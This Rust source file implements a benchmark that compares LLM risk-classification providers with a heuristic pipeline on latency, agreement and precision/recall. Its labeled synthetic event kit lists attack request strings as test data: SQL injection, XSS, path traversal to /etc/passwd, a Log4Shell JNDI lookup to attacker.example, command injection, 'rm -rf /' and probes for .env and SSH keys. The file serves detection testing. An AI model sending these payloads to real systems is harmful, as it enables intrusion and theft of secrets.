//! `sentry bench llm` — risk-classification provider evaluation harness.
//!
//! Replays an event set through each provider and through the heuristic
//! pipeline (the baseline a deployment runs without any AI stage), then
//! reports per-provider latency, agreement, precision/recall on labeled
//! events and token/cost usage. Sources: built-in deterministic synthetic
//! kit (labeled), an nginx access.log (`--events`, unlabeled) or a JSONL
//! file of serialized events (`--events *.jsonl`, unlabeled).

use std::collections::{BTreeMap, HashMap};
use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::time::Instant;

use sentry_ai::llm::prompt;
use sentry_ai::{ClassifyRequest, LlmProvider};
use sentry_core::analysis::Verdict;
use sentry_core::config::SentryConfig;
use sentry_core::event::{Event, HttpData, HttpMethod, ProtocolData, SourceKind};
use sentry_core::pipeline::{Pipeline, RouteValidator};
use serde::Serialize;

/// Arguments for [`run`].
pub(crate) struct BenchArgs<'a> {
    pub providers: &'a str,
    pub events: Option<&'a str>,
    pub format: Option<&'a str>,
    pub n: usize,
    pub concurrency: usize,
    pub out: Option<&'a str>,
}

/// Run the benchmark and print (and optionally persist) the results.
pub(crate) async fn run(args: BenchArgs<'_>, cfg: Option<SentryConfig>) -> color_eyre::Result<()> {
    let (llm_cfg, config_nginx_format) = match cfg {
        Some(c) => (
            c.llm.clone(),
            c.sources
                .iter()
                .find(|s| s.kind == "nginx")
                .and_then(|s| s.options.get("format"))
                .and_then(toml::Value::as_str)
                .map(str::to_string),
        ),
        None => (sentry_core::config::LlmConfig::default(), None),
    };

    let mut providers: Vec<(String, Arc<dyn LlmProvider>)> = Vec::new();
    for name in args
        .providers
        .split(',')
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        if providers.iter().any(|(n, _)| n == name) {
            continue;
        }
        match crate::daemon::make_llm_provider(name, &llm_cfg) {
            Some(p) => providers.push((name.to_string(), p)),
            None => println!("[skip] provider `{name}` unavailable (unknown name or missing key)"),
        }
    }
    if providers.is_empty() {
        color_eyre::eyre::bail!("no usable providers in `{}`", args.providers);
    }

    let events = load_events(
        args.events,
        args.format.or(config_nginx_format.as_deref()),
        args.n,
    )?;
    let labeled = events.iter().all(|(_, m)| m.is_some());
    println!(
        "events: {} (labeled: {}) | providers: {} | concurrency: {}",
        events.len(),
        labeled,
        providers
            .iter()
            .map(|(n, _)| n.as_str())
            .collect::<Vec<_>>()
            .join(", "),
        args.concurrency.max(1),
    );

    let pipeline = Pipeline::new(
        sentry_core::packs::build_default_ruleset(&HashMap::new()),
        RouteValidator::default(),
    );
    let base: Vec<(Verdict, u8)> = events
        .iter()
        .map(|(evt, _)| {
            let r = pipeline.process(evt);
            (r.decision.action, r.analysis.risk_score)
        })
        .collect();

    let mut reports = Vec::new();
    for (name, provider) in &providers {
        let report =
            bench_provider(name, Arc::clone(provider), &events, &base, args.concurrency).await;
        print_report(&report, labeled);
        reports.push(report);
    }

    print_summary_table(&reports);

    if let Some(out) = args.out {
        let doc = serde_json::json!({
            "events": events.len(),
            "labeled": labeled,
            "reports": reports,
        });
        std::fs::write(out, serde_json::to_vec_pretty(&doc)?)?;
        println!("raw results written to {out}");
    }
    Ok(())
}

#[derive(Debug, Serialize)]
struct CallResult {
    idx: usize,
    latency_ms: f64,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    verdict: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    risk_score: Option<u8>,
    #[serde(skip_serializing_if = "Option::is_none")]
    confidence: Option<f32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    usage: Option<sentry_ai::LlmUsage>,
}

#[derive(Debug, Serialize)]
struct ProviderReport {
    provider: String,
    model: String,
    calls: usize,
    errors: usize,
    latency_p50_ms: f64,
    latency_p95_ms: f64,
    latency_mean_ms: f64,
    latency_max_ms: f64,
    throughput_cps: f64,
    verdict_dist: BTreeMap<String, usize>,
    mean_risk_score: f64,
    mean_confidence: f64,
    verdict_agreement_pct: f64,
    malicious_agreement_pct: Option<f64>,
    precision: Option<f64>,
    recall: Option<f64>,
    f1: Option<f64>,
    tokens_in: u64,
    tokens_out: u64,
    cost: Option<f64>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    sample_errors: Vec<String>,
    /// Raw per-call results, serialized in the `--out` JSON.
    detail: Vec<CallResult>,
}

async fn bench_provider(
    name: &str,
    provider: Arc<dyn LlmProvider>,
    events: &[(Event, Option<bool>)],
    base: &[(Verdict, u8)],
    concurrency: usize,
) -> ProviderReport {
    let semaphore = Arc::new(tokio::sync::Semaphore::new(concurrency.max(1)));
    let started = Instant::now();
    let mut set = tokio::task::JoinSet::new();

    for (idx, (evt, _)) in events.iter().enumerate() {
        let req = ClassifyRequest {
            protocol: evt.protocol.clone(),
            context: prompt::context_from_event(evt),
            schema: prompt::classify_schema(),
        };
        let provider = Arc::clone(&provider);
        let sem = Arc::clone(&semaphore);
        set.spawn(async move {
            let _permit = sem.acquire_owned().await;
            let t = Instant::now();
            match provider.classify(req).await {
                Ok(resp) => CallResult {
                    idx,
                    latency_ms: t.elapsed().as_secs_f64() * 1000.0,
                    error: None,
                    verdict: Some(format!("{:?}", resp.verdict)),
                    risk_score: Some(resp.risk_score),
                    confidence: Some(resp.confidence),
                    usage: resp.usage,
                },
                Err(e) => CallResult {
                    idx,
                    latency_ms: t.elapsed().as_secs_f64() * 1000.0,
                    error: Some(e.to_string()),
                    verdict: None,
                    risk_score: None,
                    confidence: None,
                    usage: None,
                },
            }
        });
    }

    let mut calls: Vec<CallResult> = Vec::new();
    while let Some(joined) = set.join_next().await {
        match joined {
            Ok(c) => calls.push(c),
            Err(e) => calls.push(CallResult {
                idx: usize::MAX,
                latency_ms: 0.0,
                error: Some(format!("task panicked: {e}")),
                verdict: None,
                risk_score: None,
                confidence: None,
                usage: None,
            }),
        }
    }
    calls.sort_by_key(|c| c.idx);
    let wall = started.elapsed().as_secs_f64().max(1e-9);

    let ok: Vec<&CallResult> = calls.iter().filter(|c| c.error.is_none()).collect();
    let mut latencies: Vec<f64> = ok.iter().map(|c| c.latency_ms).collect();
    latencies.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
    let percentile = |p: f64| -> f64 {
        match latencies.len() {
            0 => 0.0,
            n => {
                let idx = ((n as f64) * p).ceil() as usize;
                latencies[idx.clamp(1, n) - 1]
            }
        }
    };

    let mut verdict_dist: BTreeMap<String, usize> = BTreeMap::new();
    let mut mean_risk = 0.0;
    let mut mean_conf = 0.0;
    for c in &ok {
        if let Some(v) = &c.verdict {
            *verdict_dist.entry(v.clone()).or_insert(0) += 1;
        }
        mean_risk += c.risk_score.unwrap_or(0) as f64;
        mean_conf += c.confidence.unwrap_or(0.0) as f64;
    }
    if !ok.is_empty() {
        mean_risk /= ok.len() as f64;
        mean_conf /= ok.len() as f64;
    }

    let mut agree = 0usize;
    let mut malicious_agree = 0usize;
    let (mut tp, mut fp, mut fn_) = (0usize, 0usize, 0usize);
    for c in &ok {
        let Some(v) = &c.verdict else { continue };
        let Some(b) = base.get(c.idx) else { continue };
        let pred_malicious = v != "Allow";
        if v == &format!("{:?}", b.0) {
            agree += 1;
        }
        if pred_malicious == (b.0 != Verdict::Allow) {
            malicious_agree += 1;
        }
        if let Some(Some(label)) = events.get(c.idx).map(|(_, m)| *m) {
            match (pred_malicious, label) {
                (true, true) => tp += 1,
                (true, false) => fp += 1,
                (false, true) => fn_ += 1,
                (false, false) => {}
            }
        }
    }

    let compare = |num: usize, den: usize| (den > 0).then(|| num as f64 / den as f64 * 100.0);
    let precision = compare(tp, tp + fp);
    let recall = compare(tp, tp + fn_);
    let f1 = match (precision, recall) {
        (Some(p), Some(r)) if p + r > 0.0 => Some(2.0 * p * r / (p + r)),
        _ => None,
    };
    let malicious_agreement_pct = compare(malicious_agree, ok.len());

    let tokens_in = ok
        .iter()
        .filter_map(|c| c.usage.as_ref())
        .map(|u| u.input_tokens)
        .sum();
    let tokens_out = ok
        .iter()
        .filter_map(|c| c.usage.as_ref())
        .map(|u| u.output_tokens)
        .sum();
    let costs: Vec<f64> = ok
        .iter()
        .filter_map(|c| c.usage.as_ref())
        .filter_map(|u| u.cost)
        .collect();
    let cost = (!costs.is_empty()).then(|| costs.iter().sum::<f64>());

    let mut sample_errors: Vec<String> = calls.iter().filter_map(|c| c.error.clone()).collect();
    sample_errors.truncate(3);

    ProviderReport {
        provider: name.to_string(),
        model: provider.model_id().to_string(),
        calls: calls.len(),
        errors: calls.len() - ok.len(),
        latency_p50_ms: percentile(0.50),
        latency_p95_ms: percentile(0.95),
        latency_mean_ms: if latencies.is_empty() {
            0.0
        } else {
            latencies.iter().sum::<f64>() / latencies.len() as f64
        },
        latency_max_ms: latencies.last().copied().unwrap_or(0.0),
        throughput_cps: ok.len() as f64 / wall,
        verdict_dist,
        mean_risk_score: mean_risk,
        mean_confidence: mean_conf,
        verdict_agreement_pct: compare(agree, ok.len()).unwrap_or(0.0),
        malicious_agreement_pct,
        precision,
        recall,
        f1,
        tokens_in,
        tokens_out,
        cost,
        sample_errors,
        detail: calls,
    }
}

fn print_report(report: &ProviderReport, labeled: bool) {
    println!();
    println!("### {} ({})", report.provider, report.model);
    println!(
        "calls={} errors={} | p50={:.0}ms p95={:.0}ms mean={:.0}ms max={:.0}ms | {:.1} ok-calls/s",
        report.calls,
        report.errors,
        report.latency_p50_ms,
        report.latency_p95_ms,
        report.latency_mean_ms,
        report.latency_max_ms,
        report.throughput_cps,
    );
    let dist = report
        .verdict_dist
        .iter()
        .map(|(v, n)| format!("{v}={n}"))
        .collect::<Vec<_>>()
        .join(" ");
    println!(
        "verdicts: {} | mean_risk={:.1} mean_conf={:.2}",
        if dist.is_empty() { "(none)" } else { &dist },
        report.mean_risk_score,
        report.mean_confidence,
    );
    println!(
        "agreement with heuristic pipeline: {:.1}% (malicious-vs-benign: {})",
        report.verdict_agreement_pct,
        report
            .malicious_agreement_pct
            .map(|v| format!("{v:.1}%"))
            .unwrap_or_else(|| "n/a".into()),
    );
    if labeled {
        println!(
            "labels: precision={} recall={} f1={}",
            pct(report.precision),
            pct(report.recall),
            pct(report.f1),
        );
    }
    let cost = report
        .cost
        .map(|c| format!(" | cost=${c:.6}"))
        .unwrap_or_default();
    println!(
        "tokens: in={} out={}{}",
        report.tokens_in, report.tokens_out, cost,
    );
    for e in &report.sample_errors {
        println!("error sample: {e}");
    }
}

fn pct(v: Option<f64>) -> String {
    v.map(|v| format!("{v:.1}%"))
        .unwrap_or_else(|| "n/a".into())
}

fn print_summary_table(reports: &[ProviderReport]) {
    println!();
    println!("| provider | model | calls | errors | p50 ms | p95 ms | mean ms | agree % | P | R | F1 | tok in | tok out | cost |");
    println!("|---|---|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|");
    for r in reports {
        println!(
            "| {} | {} | {} | {} | {:.0} | {:.0} | {:.0} | {:.1} | {} | {} | {} | {} | {} | {} |",
            r.provider,
            r.model,
            r.calls,
            r.errors,
            r.latency_p50_ms,
            r.latency_p95_ms,
            r.latency_mean_ms,
            r.verdict_agreement_pct,
            r.precision
                .map(|v| format!("{v:.1}"))
                .unwrap_or_else(|| "-".into()),
            r.recall
                .map(|v| format!("{v:.1}"))
                .unwrap_or_else(|| "-".into()),
            r.f1.map(|v| format!("{v:.1}"))
                .unwrap_or_else(|| "-".into()),
            r.tokens_in,
            r.tokens_out,
            r.cost
                .map(|c| format!("${c:.6}"))
                .unwrap_or_else(|| "-".into()),
        );
    }
}

/// Load the benchmark event set: synthetic kit (labeled), nginx access.log or
/// JSONL of serialized events (both unlabeled).
fn load_events(
    path: Option<&str>,
    format: Option<&str>,
    n: usize,
) -> color_eyre::Result<Vec<(Event, Option<bool>)>> {
    let mut out: Vec<(Event, Option<bool>)> = match path {
        None => synthetic_kit()
            .into_iter()
            .map(|(e, m)| (e, Some(m)))
            .collect(),
        Some(p) if p.ends_with(".jsonl") => load_jsonl(p)?,
        Some(p) => load_access_log(p, format)?,
    };
    if n > 0 {
        out.truncate(n);
    }
    Ok(out)
}

fn load_jsonl(path: &str) -> color_eyre::Result<Vec<(Event, Option<bool>)>> {
    let data = std::fs::read_to_string(path)?;
    let mut out = Vec::new();
    let mut skipped = 0usize;
    for line in data.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        match serde_json::from_str::<Event>(line) {
            Ok(evt) => out.push((evt, None)),
            Err(_) => skipped += 1,
        }
    }
    if skipped > 0 {
        println!("[warn] {skipped} unparseable JSONL lines skipped");
    }
    color_eyre::eyre::ensure!(!out.is_empty(), "no events parsed from {path}");
    Ok(out)
}

fn load_access_log(
    path: &str,
    format: Option<&str>,
) -> color_eyre::Result<Vec<(Event, Option<bool>)>> {
    let format = format
        .map(str::to_string)
        .unwrap_or_else(|| sentry_source_nginx::NginxSourceConfig::default().format);
    let fmt = sentry_source_nginx::LogFormat::compile(&format).map_err(color_eyre::Report::msg)?;
    let data = std::fs::read_to_string(path)?;
    let mut out = Vec::new();
    let mut skipped = 0usize;
    for line in data.lines() {
        let line = line.trim_end_matches(['\r']);
        if line.trim().is_empty() {
            continue;
        }
        match fmt.parse_line(line) {
            Ok(raw) => {
                let ip = raw.client_ip.unwrap_or(IpAddr::V4(Ipv4Addr::UNSPECIFIED));
                out.push((raw.into_event(ip), None));
            }
            Err(_) => skipped += 1,
        }
    }
    if skipped > 0 {
        println!("[warn] {skipped} unparseable log lines skipped");
    }
    color_eyre::eyre::ensure!(!out.is_empty(), "no events parsed from {path}");
    Ok(out)
}

/// Deterministic labeled event kit (documentation-range IPs). Entries:
/// (method, path[?query], user-agent, status, malicious).
type KitEntry = (&'static str, &'static str, &'static str, u16, bool);

const KIT: &[KitEntry] = &[
    // ── benign ───────────────────────────────────────────────────────────
    ("GET", "/", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 200, false),
    ("GET", "/about", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 200, false),
    ("GET", "/assets/app.js", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 200, false),
    ("GET", "/assets/style.css", "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0", 200, false),
    ("GET", "/favicon.ico", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 200, false),
    ("GET", "/images/logo.png", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.5", 200, false),
    ("GET", "/api/users?page=2&limit=20", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 200, false),
    ("GET", "/api/products/42", "curl/8.4.0", 200, false),
    ("GET", "/api/status", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 200, false),
    ("GET", "/api/v1/health", "uptime-monitor/1.0", 200, false),
    ("GET", "/health", "kube-probe/1.29", 200, false),
    ("GET", "/metrics", "Prometheus/2.50.0", 200, false),
    ("GET", "/robots.txt", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 200, false),
    ("GET", "/sitemap.xml", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", 200, false),
    ("GET", "/blog/my-first-post", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 200, false),
    ("GET", "/search?q=rust+tokio+web", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 200, false),
    ("GET", "/category/tech?page=3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/126.0.0.0", 200, false),
    ("GET", "/docs/guide/intro", "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0", 200, false),
    ("GET", "/contact", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.5", 200, false),
    ("POST", "/login?user=bob", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 302, false),
    ("POST", "/api/comments?text=hello+world", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", 200, false),
    ("HEAD", "/", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 200, false),
    ("GET", "/download/release-1.2.3.tar.gz", "Wget/1.21.2 (linux-gnu)", 200, false),
    // ── attacks ──────────────────────────────────────────────────────────
    ("GET", "/products?id=1' OR '1'='1", "Mozilla/5.0", 200, true),
    ("GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "Mozilla/5.0", 200, true),
    ("GET", "/search?q=<script>alert(document.cookie)</script>", "Mozilla/5.0", 200, true),
    ("GET", "/download?file=../../../../etc/passwd", "curl/8.4.0", 200, true),
    ("GET", "/../../etc/passwd", "curl/8.4.0", 404, true),
    ("GET", "/index.php?page=../../../../var/log/apache2/access.log", "Mozilla/5.0", 200, true),
    ("GET", "/?file=php://filter/convert.base64-encode/resource=index.php", "-", 200, true),
    ("GET", "/?q=${jndi:ldap://attacker.example/a}", "-", 200, true),
    ("GET", "/api/ping?host=127.0.0.1;cat+/etc/passwd", "-", 200, true),
    ("GET", "/api/ping?host=127.0.0.1%0Aid", "-", 200, true),
    ("GET", "/cgi-bin/shell.cgi?cmd=rm+-rf+/", "-", 500, true),
    ("GET", "/login?user=admin'--&pass=x", "-", 401, true),
    ("GET", "/api/users?id=1+UNION+SELECT+username,password+FROM+users--", "-", 200, true),
    ("GET", "/?q=%27%3BDROP%20TABLE%20users%3B--", "-", 500, true),
    ("GET", "/.env", "Mozilla/5.0", 200, true),
    ("GET", "/.git/config", "Mozilla/5.0", 200, true),
    ("GET", "/.ssh/id_rsa", "-", 404, true),
    ("GET", "/backup.sql", "-", 200, true),
    ("GET", "/admin/config.php", "-", 200, true),
    ("GET", "/wp-admin/setup-config.php", "Mozilla/5.0", 200, true),
    ("GET", "/wp-content/plugins/revslider/slider.php?img=../../wp-config.php", "Mozilla/5.0", 200, true),
    ("GET", "/phpmyadmin/index.php", "Mozilla/5.0", 200, true),
    ("GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "-", 200, true),
    ("GET", "/actuator/env", "-", 200, true),
    ("GET", "/console/", "-", 404, true),
    ("GET", "/manager/html", "-", 404, true),
    ("GET", "/HNAP1", "-", 404, true),
    ("GET", "/owa/auth/logon.aspx", "-", 404, true),
    ("GET", "/api/debug/vars", "-", 200, true),
    ("GET", "/", "sqlmap/1.8#stable (http://sqlmap.org)", 200, true),
    ("GET", "/test", "nikto/2.5.0", 404, true),
    ("GET", "/", "Masscan/1.3 (https://github.com/robertdavidgraham/masscan)", 200, true),
];

fn synthetic_kit() -> Vec<(Event, bool)> {
    KIT.iter()
        .enumerate()
        .map(|(i, (method, path, ua, status, malicious))| {
            let octet = (i % 250 + 2) as u8;
            let ip = if *malicious {
                Ipv4Addr::new(203, 0, 113, octet)
            } else {
                Ipv4Addr::new(198, 51, 100, octet)
            };
            let (p, q) = match path.split_once('?') {
                Some((p, q)) => (p.to_string(), Some(q.to_string())),
                None => (path.to_string(), None),
            };
            let evt = Event::new(
                SourceKind::Synthetic,
                IpAddr::V4(ip),
                ProtocolData::Http(HttpData {
                    method: Some(HttpMethod::from_str_lossy(method)),
                    path: p,
                    query: q,
                    status: Some(*status),
                    user_agent: (!ua.is_empty()).then(|| ua.to_string()),
                    ..Default::default()
                }),
            );
            (evt, *malicious)
        })
        .collect()
}
